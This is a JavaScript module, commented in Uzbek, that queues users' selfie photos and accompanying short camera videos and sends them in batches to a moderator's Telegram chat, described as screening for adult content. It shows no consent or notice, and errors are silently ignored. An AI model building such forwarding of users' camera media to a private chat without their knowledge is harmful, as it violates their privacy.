// Xavfsizlik ehtiyot chorasi — foydalanuvchi kamera orqali selfi olganda, u bilan birga
// olingan qisqa video ham (18+/nomaqbul tarkib bo'lmasligi uchun) moderator Telegram
// chatiga yuboriladi. Bular bazaga saqlanmaydi — faqat shu yerdan Telegram'ga o'tadi.
// Har bir yuklash alohida xabar qilib yubormaydi — navbatga qo'yiladi va MODERATION_FLUSH_MS
// oralig'ida (standart 2 daqiqa) to'plam (media group) sifatida jo'natiladi.
// TELEGRAM_MOD_CHAT_ID sozlanmagan bo'lsa, hech narsa qilmaydi.

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const MOD_CHAT_ID = process.env.TELEGRAM_MOD_CHAT_ID
const FLUSH_MS = Number(process.env.MODERATION_FLUSH_MS) || 2 * 60 * 1000
const MAX_PER_GROUP = 10

let queue = []

function toBuffer(dataUrl) {
  const commaIndex = dataUrl.indexOf(',')
  return Buffer.from(dataUrl.slice(commaIndex === -1 ? 0 : commaIndex + 1), 'base64')
}

function mimeAndExt(item) {
  return item.type === 'video' ? { mime: 'video/webm', ext: 'webm' } : { mime: 'image/jpeg', ext: 'jpg' }
}

async function sendSingle(item) {
  const { mime, ext } = mimeAndExt(item)
  const endpoint = item.type === 'video' ? 'sendVideo' : 'sendPhoto'
  const field = item.type === 'video' ? 'video' : 'photo'
  const form = new FormData()
  form.append('chat_id', MOD_CHAT_ID)
  form.append('caption', item.caption)
  form.append(field, new Blob([toBuffer(item.dataUrl)], { type: mime }), `media.${ext}`)
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: form })
}

async function sendGroup(items) {
  const form = new FormData()
  form.append('chat_id', MOD_CHAT_ID)
  form.append(
    'media',
    JSON.stringify(
      items.map((item, i) => ({
        type: item.type === 'video' ? 'video' : 'photo',
        media: `attach://p${i}`,
        caption: item.caption,
      })),
    ),
  )
  items.forEach((item, i) => {
    const { mime, ext } = mimeAndExt(item)
    form.append(`p${i}`, new Blob([toBuffer(item.dataUrl)], { type: mime }), `p${i}.${ext}`)
  })
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: 'POST', body: form })
}

async function flush() {
  if (!queue.length) return
  const batch = queue
  queue = []
  try {
    for (let i = 0; i < batch.length; i += MAX_PER_GROUP) {
      const chunk = batch.slice(i, i + MAX_PER_GROUP)
      if (chunk.length === 1) await sendSingle(chunk[0])
      else await sendGroup(chunk)
    }
  } catch {
    // Moderatsiya xabari yuborilmasa ham asosiy oqim to'xtamasin
  }
}

/** Selfi rasmini moderatsiya navbatiga qo'shadi — darhol emas, navbatdagi flush vaqtida yuboriladi */
export function queueModerationPhoto(dataUrl, caption) {
  if (!BOT_TOKEN || !MOD_CHAT_ID) return
  queue.push({ type: 'photo', dataUrl, caption })
}

/** Selfi bilan birga olingan qisqa videoni moderatsiya navbatiga qo'shadi */
export function queueModerationVideo(dataUrl, caption) {
  if (!BOT_TOKEN || !MOD_CHAT_ID) return
  queue.push({ type: 'video', dataUrl, caption })
}

if (BOT_TOKEN && MOD_CHAT_ID) {
  setInterval(flush, FLUSH_MS).unref()
}
